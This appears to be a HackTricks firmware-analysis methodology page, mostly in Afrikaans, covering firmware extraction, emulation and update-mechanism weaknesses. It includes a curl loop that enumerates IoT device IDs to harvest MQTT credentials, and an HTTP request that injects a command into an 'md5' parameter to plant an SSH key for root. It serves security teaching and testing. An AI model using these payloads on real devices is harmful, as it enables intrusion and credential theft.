# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Inleiding**

### Verwante hulpbronne


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware is noodsaaklike sagteware wat toestelle in staat stel om korrek te funksioneer deur die kommunikasie tussen die hardware-komponente en die sagteware waarmee gebruikers interaksie het, te bestuur en te fasiliteer. Dit word in permanente geheue gestoor, wat verseker dat die toestel toegang het tot noodsaaklike instruksies vanaf die oomblik dat dit aangeskakel word, wat lei tot die opstart van die bedryfstelsel. Die ondersoek en moontlike wysiging van firmware is 'n kritieke stap om sekuriteitskwesbaarhede te identifiseer.

## **Inligtingsinsameling**

**Inligtingsinsameling** is 'n kritieke aanvanklike stap om 'n toestel se samestelling en die tegnologieë wat dit gebruik te verstaan. Hierdie proses behels die versameling van data oor:

- Die CPU-argitektuur en die bedryfstelsel waarop dit loop
- Bootloader-spesifieke besonderhede
- Hardware-uitleg en datasheets
- Codebase-metrieke en bronliggings
- Eksterne biblioteke en lisensietipes
- Opdateringsgeskiedenis en regulatoriese sertifiseringe
- Argitektoniese en vloei-diagramme
- Sekuriteitsevaluerings en geïdentifiseerde kwesbaarhede

Vir hierdie doel is **open-source intelligence (OSINT)** gereedskap onskatbaar, soos ook die ontleding van alle beskikbare open-source sagtewarekomponente deur handmatige en geoutomatiseerde hersieningsprosesse. Tools like [Coverity Scan](https://scan.coverity.com) and [Semmle’s LGTM](https://lgtm.com/#explore) bied gratis static analysis wat gebruik kan word om potensiële probleme te vind.

## **Verkryging van Firmware**

Die verkryging van firmware kan op verskeie maniere benader word, elk met 'n eie vlak van kompleksiteit:

- **Direk** van die bron (ontwikkelaars, vervaardigers)
- **Bouw** dit vanaf voorsiene instruksies
- **Aflaai** vanaf amptelike support sites
- Gebruik **Google dork** queries om gehoste firmware-lêers te vind
- Toegang tot **cloud storage** direk, met gereedskap soos [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Intersepteer **updates** via man-in-the-middle tegnieke
- **Extracting** vanaf die toestel deur verbindings soos **UART**, **JTAG**, of **PICit**
- **Sniffing** vir update-versoeke binne toestelkommunikasie
- Identifiseer en gebruik **hardcoded update endpoints**
- **Dumping** vanaf die bootloader of netwerk
- **Verwyder en lees** die stoorchip wanneer niks anders werk nie, met toepaslike hardware-gereedskap

## Analyse van die firmware

Nou dat jy die firmware het, moet jy inligting daaroor uittrek om te weet hoe om dit te hanteer. Verskeie gereedskap wat jy hiervoor kan gebruik:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
As jy nie baie met daardie tools vind nie, kontroleer die **entropie** van die image met `binwalk -E <bin>`; as die entropie laag is, is dit waarskynlik nie geënkripteer nie. As die entropie hoog is, is dit waarskynlik geënkripteer (of op een of ander manier gekomprimeer).

Verder kan jy hierdie tools gebruik om **lêers wat binne die firmware ingebed is** te onttrek:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Of [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) om die lêer te inspekteer.

### Verkry die lêerstelsel

Met die voorafgenoemde gereedskap soos `binwalk -ev <bin>` behoort jy in staat te wees om die **lêerstelsel te onttrek**.\
Binwalk onttrek dit gewoonlik binne 'n **gids met die naam van die lêerstelseltipe**, wat gewoonlik een van die volgende is: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Handmatige lêerstelsel-onttrekking

Partykeer sal binwalk **nie die magic byte van die lêerstelsel in sy handtekeninge hê nie**. In sulke gevalle, gebruik binwalk om die **offset van die lêerstelsel te vind en die gekomprimeerde lêerstelsel te carve** uit die binêre en die lêerstelsel **handmatig te onttrek** volgens sy tipe met die stappe hieronder.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Voer die volgende **dd command** uit, carving the Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatiewelik kan die volgende kommando ook uitgevoer word.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- For squashfs (used in the example above)

`$ unsquashfs dir.squashfs`

Lêers sal daarna in die `squashfs-root` directory wees.

- CPIO-argieflêers

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Vir jffs2-lêerstelsels

`$ jefferson rootfsfile.jffs2`

- Vir ubifs-lêerstelsels met NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware-ontleding

Sodra die firmware verkry is, is dit noodsaaklik om dit te ontleed om die struktuur en potensiële kwesbaarhede te verstaan. Hierdie proses behels die gebruik van verskeie gereedskap om waardevolle data uit die firmware-image te analiseer en te onttrek.

### Aanvanklike analise-gereedskap

'n Stel kommando's word voorsien vir die aanvanklike inspeksie van die binêre lêer (verwys as `<bin>`). Hierdie kommando's help om lêertipes te identifiseer, strings te onttrek, binêre data te analiseer, en die partisies- en lêerstelselbesonderhede te verstaan:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Om die enkripsie-status van die image te bepaal, word die **entropie** gekontroleer met `binwalk -E <bin>`. Lae entropie dui op 'n gebrek aan enkripsie, terwyl hoë entropie moontlike enkripsie of kompressie aandui.

For extracting **embedded files**, tools and resources like the **file-data-carving-recovery-tools** documentation and **binvis.io** for file inspection are recommended.

### Uittrekking van die Lêerstelsel

Deur `binwalk -ev <bin>` te gebruik, kan mens gewoonlik die lêerstelsel onttrek, dikwels in 'n gids wat na die lêerstelseltipe vernoem is (bv. squashfs, ubifs). Wanneer egter **binwalk** nie die lêerstelseltipe kan herken weens ontbrekende magic bytes nie, is handmatige uittrekking nodig. Dit behels die gebruik van `binwalk` om die offset van die lêerstelsel te vind, gevolg deur die `dd` opdrag om die lêerstelsel uit te kerf:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Daarna, afhangende van die lêerstelseltipe (bv. squashfs, cpio, jffs2, ubifs), word verskillende opdragte gebruik om die inhoud handmatig uit te pak.

### Lêerstelsel-analise

Met die lêerstelsel uitgepak, begin die soektog na sekuriteitsgebreke. Aandag word gegee aan onveilige netwerkdaemons, hardcoded credentials, API endpoints, update server-funksionaliteite, ongecompileerde kode, opstartskripte, en gecompileerde binaries vir offline-ontleding.

**Belangrike plekke** en **items** om te ondersoek sluit in:

- **etc/shadow** and **etc/passwd** vir gebruikersbewyse
- SSL-sertifikate en sleutels in **etc/ssl**
- Konfigurasie- en skrip-lêers vir moontlike kwesbaarhede
- Ingebedde binaries vir verdere ontleding
- Algemene IoT-toestel webservers en binaries

Verskeie gereedskap help om sensitiewe inligting en kwesbaarhede binne die lêerstelsel te ontdek:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) en [**Firmwalker**](https://github.com/craigz28/firmwalker) vir sensitiewe inligtingsoektog
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) vir omvattende firmware-analise
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), en [**EMBA**](https://github.com/e-m-b-a/emba) vir statiese en dinamiese ontleding

### Sekuriteitskontroles op gecompileerde binaries

Beide bronkode en gecompileerde binaries wat in die lêerstelsel gevind word, moet ondersoek word vir kwesbaarhede. Gereedskap soos **checksec.sh** vir Unix-binaries en **PESecurity** vir Windows-binaries help om onbeskermde binaries te identifiseer wat uitgebuit kan word.

## Oes van cloud-config en MQTT-credentials via afgeleide URL-tokens

Baie IoT-hubs haal hul per-toestel konfigurasie vanaf 'n cloud-endpoint wat soos volg lyk:

- `https://<api-host>/pf/<deviceId>/<token>`

Tydens firmware-analise kan jy vind dat `<token>` plaaslik afgelei word vanaf die device ID met 'n hardcoded secret, byvoorbeeld:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Hierdie ontwerp stel enigiemand wat die deviceId en STATIC_KEY ken in staat om die URL te herbou en cloud-config te trek, wat dikwels plaintext MQTT-credentials en topic-voorvoegsels openbaar.

Praktiese werkvloei:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Kyk vir lyne wat die cloud config URL pattern en broker address uitdruk, byvoorbeeld:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Herwin STATIC_KEY en token-algoritme uit firmware

- Laai die binaries in Ghidra/radare2 en soek na die config path ("/pf/") of MD5 gebruik.
- Bevestig die algoritme (bv., MD5(deviceId||STATIC_KEY)).
- Bepaal die token in Bash en maak die digest uppercase:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Oes cloud config en MQTT credentials

- Stel die URL saam en haal JSON met curl; ontleed met jq om secrets uit te trek:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Misbruik plaintext MQTT en swak topic ACLs (indien teenwoordig)

- Gebruik herwonne credentials om op maintenance topics te subscribe en te soek na sensitiewe events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerate voorspelbare device IDs (op skaal, met authorization)

- Baie ekosisteme inkorporeer vendor OUI/product/type bytes gevolg deur 'n opeenvolgende agtervoegsel.
- Jy kan kandidaat-ID's deurloop, tokens aflei en configs programmaties ophaal:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notes
- Verkry altyd uitdruklike toestemming voordat jy mass enumeration probeer.
- Gebruik waar moontlik emulation of static analysis om geheime te herstel sonder om target hardware te wysig.


Die proses om firmware te emuleer maak **dynamic analysis** moontlik, hetsy van die werking van 'n toestel of van 'n individuele program. Hierdie benadering kan uitdagings ondervind as gevolg van hardware- of architecture-afhanklikhede, maar deur die root filesystem of spesifieke binaries na 'n toestel met ooreenstemmende architecture en endianness, soos 'n Raspberry Pi, of na 'n pre-built virtual machine oor te dra, kan verdere toetsing vergemaklik word.

### Emulating Individual Binaries

Vir die ondersoek van enkelprogramme is dit deurslaggewend om die program se endianness en CPU architecture te identifiseer.

#### Voorbeeld met MIPS Architecture

Om 'n MIPS architecture binary te emuleer, kan mens die volgende command gebruik:
```bash
file ./squashfs-root/bin/busybox
```
En om die nodige emulasie-gereedskap te installeer:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Vir MIPS (big-endian) word `qemu-mips` gebruik, en vir little-endian binaries sal `qemu-mipsel` die keuse wees.

#### ARM Argitektuur-emulasie

Vir ARM binaries is die proses soortgelyk, met die `qemu-arm` emulator wat vir emulasie gebruik word.

### Volledige Stelsel-emulasie

Gereedskap soos [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), en ander vergemaklik volledige firmware-emulasie, outomatiseer die proses en help by dinamiese analise.

## Dinamiese Analise in Praktyk

Op hierdie stadium word óf 'n werklike óf 'n geëmuleerde toestelomgewing vir analise gebruik. Dit is noodsaaklik om shell-toegang tot die OS en filesystem te behou. Emulasie mag nie hardeware-interaksies perfek naboots nie, wat af en toe 'n herbegin van die emulasie vereis. Analise moet die filesystem hersien, blootgestelde webpages en netwerkdienste eksploiteer, en bootloader-kwesbaarhede ondersoek. Firmware-integriteitstoetse is krities om potensiële backdoor-kwesbaarhede te identifiseer.

## Runtime-analise tegnieke

Runtime-analise behels interaksie met 'n proses of binary in sy bedryfsomgewing, met gebruik van gereedskap soos gdb-multiarch, Frida, en Ghidra om breakpoints te stel en kwesbaarhede te identifiseer deur middel van fuzzing en ander tegnieke.

## Binary Eksploitasie en Proof-of-Concept

Om 'n PoC te ontwikkel vir geïdentifiseerde kwesbaarhede vereis 'n diep begrip van die teiken-argitektuur en programmering in laevlak-tale. Binary runtime-beskermings in embedded systems is skaars, maar wanneer teenwoordig kan tegnieke soos Return Oriented Programming (ROP) nodig wees.

## Vooraf-gekonfigureerde Bedryfstelsels vir Firmware-analise

Bedryfstelsels soos [AttifyOS](https://github.com/adi0x90/attifyos) en [EmbedOS](https://github.com/scriptingxss/EmbedOS) bied vooraf-gekonfigureerde omgewings vir firmware sekuriteitstoetsing, toegerus met die nodige gereedskap.

## Vooraf-gekonfigureerde OS'e om Firmware te analiseer

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS is 'n distro bedoel om jou te help om security assessment en penetration testing van Internet of Things (IoT) toestelle uit te voer. Dit spaar jou baie tyd deur 'n vooraf-gekonfigureerde omgewing met al die nodige gereedskap voorgeïnstalleer te verskaf.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): 'n Embedded security testing bedryfstelsel gebaseer op Ubuntu 18.04, vooraf gelaai met firmware security testing tools.

## Firmware Downgrade-aanvalle & Onseker Opdateringsmeganismes

Selfs wanneer 'n verkoper kriptografiese handtekeningkontroles vir firmware-beelds implementeer, word **weergawe-rollback (downgrade) beskerming dikwels weggelaat**. As die boot- of recovery-loader slegs die handtekening verifieer met 'n ingeslote publieke sleutel maar nie die *weergawe* (of 'n monotone teller) van die beeld wat geskryf word vergelyk nie, kan 'n aanvaller wettiglik 'n **ouer, kwesbare firmware installeer wat steeds 'n geldige handtekening dra** en sodoende herstelde kwesbaarhede herintreer.

Tipiese aanvalswerkvloei:

1. **Verkry 'n ouer getekende beeld**
* Kry dit vanaf die verkoper se publieke aflaaipoortaal, CDN of ondersteuningswerf.
* Ontrafel dit uit begeleidende mobiele/desktop toepassings (bv. binne 'n Android APK onder `assets/firmware/`).
* Verkry dit van derdeparty-repositories soos VirusTotal, internetargiewe, forums, ens.
2. **Laai of bedien die beeld na die toestel** via enige blootgestelde opdateringskanaal:
* Web UI, mobile-app API, USB, TFTP, MQTT, etc.
* Baie verbruikers-IoT toestelle openbaar *unauthenticated* HTTP(S)-endpunte wat Base64-geënkodeerde firmware-blobs aanvaar, dit server-side dekodeer en recovery/upgrade aktiveer.
3. Na die downgrade, eksploiteer 'n kwesbaarheid wat in die nuwer vrystelling gepatch is (byvoorbeeld 'n command-injection filter wat later bygevoeg is).
4. Opsioneel, flash die jongste beeld terug of skakel opdaterings uit om opsporing te vermy sodra permanente toegang verkry is.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
In die kwesbare (gedowngrade) firmware word die `md5` parameter direk in 'n shell command gekonkateneer sonder inset-sanitisasie, wat injection van ewekansige opdragte toelaat (hier – enabling SSH key-based root access). Later firmware-weergawes het 'n basiese karakterfilter ingehou, maar die afwesigheid van downgrade-beskerming maak die regstelling nutteloos.

### Uittrekking van Firmware uit Mobiele Apps

Baie verskaffers pak volledige firmware-beelde in hul begeleidende mobiele toepassings sodat die app die toestel oor Bluetooth/Wi‑Fi kan opdateer. Hierdie pakkette word algemeen ongesleuteld in die APK/APEX gestoor onder paaie soos `assets/fw/` of `res/raw/`. Gereedskap soos `apktool`, `ghidra`, of selfs net `unzip` laat jou toe om getekende beelde te onttrek sonder om die fisiese hardeware aan te raak.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Kontrolelys vir die beoordeling van opdateringslogika

* Is die transport/authentication van die *update endpoint* voldoende beskerm (TLS + authentication)?
* Vergelyk die toestel **version numbers** of 'n **monotonic anti-rollback counter** voordat dit geflashed word?
* Word die image binne 'n secure boot chain geverifieer (bv. signatures deur ROM code nagegaan)?
* Voer userland code addisionele sanity checks uit (bv. allowed partition map, model number)?
* Herbruik *partial* of *backup* update flows dieselfde validation logic?

> 💡  As enige van die bostaande ontbreek, is die platform waarskynlik kwesbaar vir rollback attacks.

## Kwetsbare firmware om mee te oefen

Om te oefen met die opsporing van kwesbaarhede in firmware, gebruik die volgende kwetsbare firmware-projekte as beginpunt.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Verwysings

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)


- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)

## Opleiding en Sertifisering

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

{{#include ../../banners/hacktricks-training.md}}
